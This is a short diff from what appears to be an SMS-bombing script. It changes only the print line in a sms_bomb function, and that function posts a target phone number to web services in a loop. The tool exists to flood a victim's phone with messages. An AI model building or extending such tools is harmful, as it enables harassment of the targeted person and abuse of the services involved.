@@ -27,7 +27,7 @@ def sms_bomb(phone):
                 response = requests.post(url,json={f'{payload}': f"{phone}"},headers={'user-agent': f'{ua}', 'content-type': f'{header}'})
                 
                 
-            print(response.url, response.status_code)
+            print(f"Post Url: {response.url}", f"Status code: {response.status_code}")
         except:
             print("Something going wrong!")
 
